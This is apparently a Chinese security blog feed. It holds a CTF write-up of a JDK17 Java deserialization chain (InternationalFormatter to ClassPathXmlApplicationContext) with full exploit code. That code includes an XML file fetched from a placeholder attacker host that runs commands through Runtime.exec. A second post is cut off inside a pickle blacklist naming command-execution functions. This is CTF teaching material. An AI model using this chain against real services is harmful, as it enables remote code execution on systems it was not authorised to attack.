(req.getRequestURI().getPath()) &#123;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;/der&quot;</span> -&gt; &#123;<br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-type">var</span> <span class="hljs-variable">param</span> <span class="hljs-operator">=</span> req.getRequestURI().getQuery();<br>                        <span class="hljs-keyword">yield</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.ObjectInputStream(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.ByteArrayInputStream(java.util.Base64.getDecoder().decode(param))).readObject().toString();<br>                    &#125; <span class="hljs-keyword">catch</span> (Throwable e) &#123;<br>                        e.printStackTrace();<br>                        <span class="hljs-keyword">yield</span> <span class="hljs-string">&quot;:(&quot;</span>;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">default</span> -&gt; &#123;<br>                    code = <span class="hljs-number">404</span>;<br>                    <span class="hljs-keyword">yield</span> <span class="hljs-string">&quot;Not found&quot;</span>;<br>                &#125;<br>            &#125;;<br>            req.sendResponseHeaders(code, <span class="hljs-number">0</span>);<br>            <span class="hljs-type">var</span> <span class="hljs-variable">os</span> <span class="hljs-operator">=</span> req.getResponseBody();<br>            os.write(response.getBytes());<br>            os.close();<br>        &#125;);<br>        server.start();<br>        System.out.printf(<span class="hljs-string">&quot;Server listening on :%s\n&quot;</span>, port);<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>很显然的反序列化入口，而且是JDK17环境。</p><p>给的依赖包如下：</p><p><img src="/2024/10/30/%E5%9F%BA%E4%BA%8E2024GeekCon-AVSS-oldlog%E7%9A%84JDK%E9%AB%98%E7%89%88%E6%9C%ACJNDI%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20241114173104336.png" alt="image-20241114173104336"></p><p>n1ght.jar里面是出题人自己写的parseObject返回任意字符串作为链子的一部分，算是使得gadget更加稳定触发了：</p><p><img src="/2024/10/30/%E5%9F%BA%E4%BA%8E2024GeekCon-AVSS-oldlog%E7%9A%84JDK%E9%AB%98%E7%89%88%E6%9C%ACJNDI%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20241114173231111.png" alt="image-20241114173231111"></p><p>这里用到的就是2024GeekCon_AVSS-oldlog的trick。</p><p>直接搬用一下出题人wp的分析：</p><h3 id="InternationalFormatter-readObject"><a href="#InternationalFormatter-readObject" class="headerlink" title="InternationalFormatter#readObject"></a>InternationalFormatter#readObject</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Serial</span><br> <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream s)</span><br>     <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>     s.defaultReadObject();<br>     updateMaskIfNecessary();<br> &#125;<br></code></pre></td></tr></table></figure><h3 id="跟进updateMaskIfNecessary-："><a href="#跟进updateMaskIfNecessary-：" class="headerlink" title="跟进updateMaskIfNecessary()："></a>跟进<code>updateMaskIfNecessary()</code>：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">void</span> <span class="hljs-title function_">updateMaskIfNecessary</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">if</span> (!getAllowsInvalid() &amp;&amp; (getFormat() != <span class="hljs-literal">null</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (!isValidMask()) &#123;<br>            updateMask();<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">newString</span> <span class="hljs-operator">=</span> getFormattedTextField().getText();<br><br>            <span class="hljs-keyword">if</span> (!newString.equals(string)) &#123;<br>                updateMask();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="跟进updateMask-："><a href="#跟进updateMask-：" class="headerlink" title="跟进updateMask()："></a>跟进<code>updateMask()</code>：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">void</span> <span class="hljs-title function_">updateMask</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">if</span> (getFormat() != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-type">Document</span> <span class="hljs-variable">doc</span> <span class="hljs-operator">=</span> getFormattedTextField().getDocument();<br><br>        validMask = <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">if</span> (doc != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                string = doc.getText(<span class="hljs-number">0</span>, doc.getLength());<br>            &#125; <span class="hljs-keyword">catch</span> (BadLocationException ble) &#123;<br>                string = <span class="hljs-literal">null</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (string != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> stringToValue(string);<br>                    <span class="hljs-type">AttributedCharacterIterator</span> <span class="hljs-variable">iterator</span> <span class="hljs-operator">=</span> getFormat().<br>                              formatToCharacterIterator(value);<br><br>                    updateMask(iterator);<br>                &#125;<br>                <span class="hljs-keyword">catch</span> (ParseException pe) &#123;&#125;<br>                <span class="hljs-keyword">catch</span> (IllegalArgumentException iae) &#123;&#125;<br>                <span class="hljs-keyword">catch</span> (NullPointerException npe) &#123;&#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="跟进Object-value-stringToValue-string-："><a href="#跟进Object-value-stringToValue-string-：" class="headerlink" title="跟进Object value = stringToValue(string)："></a>跟进<code>Object value = stringToValue(string)</code>：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">stringToValue</span><span class="hljs-params">(String text)</span> <span class="hljs-keyword">throws</span> ParseException &#123;<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> stringToValue(text, getFormat());<br><br>    <span class="hljs-comment">// Convert to the value class if the Value returned from the</span><br>    <span class="hljs-comment">// Format does not match.</span><br>    <span class="hljs-keyword">if</span> (value != <span class="hljs-literal">null</span> &amp;&amp; getValueClass() != <span class="hljs-literal">null</span> &amp;&amp;<br>                         !getValueClass().isInstance(value)) &#123;<br>        value = <span class="hljs-built_in">super</span>.stringToValue(value.toString());<br>    &#125;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">if</span> (!isValidValue(value, <span class="hljs-literal">true</span>)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ParseException</span>(<span class="hljs-string">&quot;Value not within min/max range&quot;</span>, <span class="hljs-number">0</span>);<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (ClassCastException cce) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ParseException</span>(<span class="hljs-string">&quot;Class cast exception comparing values: &quot;</span><br>                                 + cce, <span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> value;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="跟进到DefaultFormatter-stringToValue："><a href="#跟进到DefaultFormatter-stringToValue：" class="headerlink" title="跟进到DefaultFormatter#stringToValue："></a>跟进到<code>DefaultFormatter#stringToValue</code>：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">stringToValue</span><span class="hljs-params">(String string)</span> <span class="hljs-keyword">throws</span> ParseException &#123;<br>    Class&lt;?&gt; vc = getValueClass();<br>    <span class="hljs-type">JFormattedTextField</span> <span class="hljs-variable">ftf</span> <span class="hljs-operator">=</span> getFormattedTextField();<br><br>    <span class="hljs-keyword">if</span> (vc == <span class="hljs-literal">null</span> &amp;&amp; ftf != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> ftf.getValue();<br><br>        <span class="hljs-keyword">if</span> (value != <span class="hljs-literal">null</span>) &#123;<br>            vc = value.getClass();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (vc != <span class="hljs-literal">null</span>) &#123;<br>        Constructor&lt;?&gt; cons;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            ReflectUtil.checkPackageAccess(vc);<br>            SwingUtilities2.checkAccess(vc.getModifiers());<br>            cons = vc.getConstructor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>&lt;?&gt;[]&#123;String.class&#125;);<br><br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException nsme) &#123;<br>            cons = <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (cons != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                SwingUtilities2.checkAccess(cons.getModifiers());<br>                <span class="hljs-keyword">return</span> cons.newInstance(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; string &#125;);<br>            &#125; <span class="hljs-keyword">catch</span> (Throwable ex) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ParseException</span>(<span class="hljs-string">&quot;Error creating instance&quot;</span>, <span class="hljs-number">0</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> string;<br>&#125;<br></code></pre></td></tr></table></figure><p>发现<code>cons.newInstance(new Object[] &#123; string &#125;)</code>实现了任意类的实例化，这里就想到了<code>ClassPathXmlApplicationContext</code>的trick。</p><h3 id="官方调用栈"><a href="#官方调用栈" class="headerlink" title="官方调用栈"></a>官方调用栈</h3><p><img src="/2024/10/30/%E5%9F%BA%E4%BA%8E2024GeekCon-AVSS-oldlog%E7%9A%84JDK%E9%AB%98%E7%89%88%E6%9C%ACJNDI%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20241114173904157.png" alt="image-20241114173904157"></p><h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><p><code>Exp.java</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.n1ght.StringFormat;<br><span class="hljs-keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;<br><br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> javax.swing.text.DefaultFormatter;<br><span class="hljs-keyword">import</span> javax.swing.text.InternationalFormatter;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span>  Exception&#123;<br><br>        <span class="hljs-type">InternationalFormatter</span> <span class="hljs-variable">internationalFormatter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InternationalFormatter</span>();<br>        <span class="hljs-type">DefaultFormatter</span> <span class="hljs-variable">defaultFormatter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultFormatter</span>();<br>        defaultFormatter.setValueClass(ClassPathXmlApplicationContext.class);<br>        <span class="hljs-type">JFormattedTextField</span> <span class="hljs-variable">jFormattedTextField</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JFormattedTextField</span>(defaultFormatter);<br>        jFormattedTextField.setValue(<span class="hljs-string">&quot;http://vps:port/exp.xml&quot;</span>);<br>        <span class="hljs-type">StringFormat</span> <span class="hljs-variable">aaa</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringFormat</span>(<span class="hljs-string">&quot;&#123;0&#125;&quot;</span>);<br>        internationalFormatter.setFormat(aaa);<br>        UnSafeTools.setObject(internationalFormatter,<br>                JFormattedTextField.AbstractFormatter.class.getDeclaredField(<span class="hljs-string">&quot;ftf&quot;</span>),<br>                jFormattedTextField);<br>        UnSafeTools.setObject(internationalFormatter,<br>                DefaultFormatter.class.getDeclaredField(<span class="hljs-string">&quot;allowsInvalid&quot;</span>),<br>                <span class="hljs-literal">false</span>);<br>        UnSafeTools.setObject(internationalFormatter,<br>                InternationalFormatter.class.getDeclaredField(<span class="hljs-string">&quot;validMask&quot;</span>),<br>                <span class="hljs-literal">true</span>);<br>        UnSafeTools.setObject(internationalFormatter,<br>                DefaultFormatter.class.getDeclaredField(<span class="hljs-string">&quot;valueClass&quot;</span>),<br>                ClassPathXmlApplicationContext.class);<br>        internationalFormatter.setAllowsInvalid(<span class="hljs-literal">false</span>);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bao</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(bao).writeObject(internationalFormatter);<br>        System.out.println(Base64.getEncoder().encodeToString(bao.toByteArray()));<br>        <span class="hljs-comment">//ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bao.toByteArray());</span><br>        <span class="hljs-comment">//new ObjectInputStream(byteArrayInputStream).readObject();</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>UnSafeTools.java</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> sun.misc.Unsafe;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UnSafeTools</span> &#123;<br>    <span class="hljs-keyword">static</span> Unsafe unsafe;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UnSafeTools</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Unsafe <span class="hljs-title function_">getUnsafe</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        unsafe = (Unsafe)field.get((Object)<span class="hljs-literal">null</span>);<br>        <span class="hljs-keyword">return</span> unsafe;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setObject</span><span class="hljs-params">(Object o, Field field, Object value)</span> &#123;<br>        unsafe.putObject(o, unsafe.objectFieldOffset(field), value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">newClass</span><span class="hljs-params">(Class c)</span> <span class="hljs-keyword">throws</span> InstantiationException &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> unsafe.allocateInstance(c);<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">bypassModule</span><span class="hljs-params">(Class src, Class dst)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> getUnsafe();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getModule</span> <span class="hljs-operator">=</span> dst.getDeclaredMethod(<span class="hljs-string">&quot;getModule&quot;</span>);<br>        getModule.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">module</span> <span class="hljs-operator">=</span> getModule.invoke(dst);<br>        <span class="hljs-type">long</span> <span class="hljs-variable">addr</span> <span class="hljs-operator">=</span> unsafe.objectFieldOffset(Class.class.getDeclaredField(<span class="hljs-string">&quot;module&quot;</span>));<br>        unsafe.getAndSetObject(src, addr, <span class="hljs-keyword">module</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>            unsafe = (Unsafe)field.get((Object)<span class="hljs-literal">null</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var1) &#123;<br>            System.out.println(<span class="hljs-string">&quot;Error: &quot;</span> + var1);<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>exp.xml</code>：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="hljs-string"><span class="hljs-tag">http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;data&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.String&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>PAYLOAD<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;#&#123;T(java.lang.Runtime).getRuntime().exec(&#x27;command&#x27;)&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2024/10/30/%E5%9F%BA%E4%BA%8E2024GeekCon-AVSS-oldlog%E7%9A%84JDK%E9%AB%98%E7%89%88%E6%9C%ACJNDI%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20241114174343672.png" alt="image-20241114174343672"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>那么回到<code>2024GeekCon-AVSS-oldlog</code>，可以说原题是相当精彩，衍生出今年很多Java题目的打法。你可以从今年许多JDK17反序列化题目中轻松地找到它的身影。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pickle反序列化真得会手搓opcode吧</title>
    <link href="/2024/10/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%9F%E5%BE%97%E4%BC%9A%E6%89%8B%E6%90%93opcode%E5%90%A7/"/>
    <url>/2024/10/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%9F%E5%BE%97%E4%BC%9A%E6%89%8B%E6%90%93opcode%E5%90%A7/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>昨天有人让我帮看一个傻逼新生赛。</p><p>其实就是一个很简单的pickle反序列化绕过find_class。</p><p>看着很唬人：</p><p>app.py：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> io<br><br>BLACKLISTED_CLASSES = [<br>    <span class="hljs-string">&#x27;subprocess.check_output&#x27;</span>,<span class="hljs-string">&#x27;builtins.eval&#x27;</span>,<span class="hljs-string">&#x27;builtins.exec&#x27;</span>,<br>    <span class="hljs-string">&#x27;os.system&#x27;</span>, <span class="hljs-string">&#x27;os.popen&#x27;</span>, <span class="hljs-string">&#x27;os.popen2&#x27;</span>, <span class="hljs-string">&#x27;os.popen3&#x27;</span>, <span class="hljs-string">&#x27;os.popen4&#x27;</span>, <br>    <span class="hljs-string">&#x27;pickle.load&#x27;</span>, <span class="hljs-string">&#x27;pickle.loads&#x27;</span>, <span class="hljs-string">&#x27;cPickle.load&#x27;</span>, <span class="hljs-string">&#x27;cPickle.loads&#x27;</span>, <br>    <span class="hljs-string">&#x27;subprocess.call&#x27;</span>, <span class="hljs-string">&#x27;subprocess.check_call&#x27;</span>, <span class="hljs-string">&#x27;subprocess.Popen&#x27;</span>, <br>    <span class="hljs-string">&#x27;commands.getstatusoutput&#x27;</span>, <span class="hljs-string">&#x27;commands.getoutput&#x27;</span>, <span class="hljs-string">&#x27;commands.getstatus&#x27;</span>, <br>    <span class="hljs-string">&#x27;pty.spawn&#x27;</span>, <span class="hljs-string">&#x27;posixfile.open&#x27;</span>, <span class="hljs-string">&#x27;posixfile.fileopen&#x27;</span>,<br>    <span class="hljs-string">&#x27;__import__&#x27;</span>,<span class="hljs-string">&#x27;os.spawn*&#x27;</span>,<span class="hljs-string">&#x27;sh.Command&#x27;</span>,<span class="hljs-string">&#x27;imp.load_module&#x27;</span>,<span class="hljs-string">&#x27;builtins.compile&#x27;</span><br>    <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;builtins.execfile&#x27;</span>, <span class="hljs-string">&#x27;compile&#x27;</span>, <span class="hljs-string">&#x27;builtins.open&#x27;</span>, <span class="hljs-string">&#x27;builtins.file&#x27;</span>, <span class="hljs-string">&#x27;os.system&#x27;</span>, <br>    <span class="hljs-string">&#x27;os.fdopen&#x27;</span>, <span class="hljs-string">&#x27;os.tmpfile&#x27;</span>, <span class="hljs-string">&#x27;os.fchmod&#x27;</span>, <span class="hljs-string">&#x27;os.fchown&#x27;</span>, <span class="hljs-string">&#x27;os.open&#x27;</span>, <span class="hljs-string">&#x27;os.openpty&#x27;</span>, <span class="hljs-string">&#x27;os.read&#x27;</span>, <span class="hljs-string">&#x27;os.pipe&#x27;</span>,<br>    <span 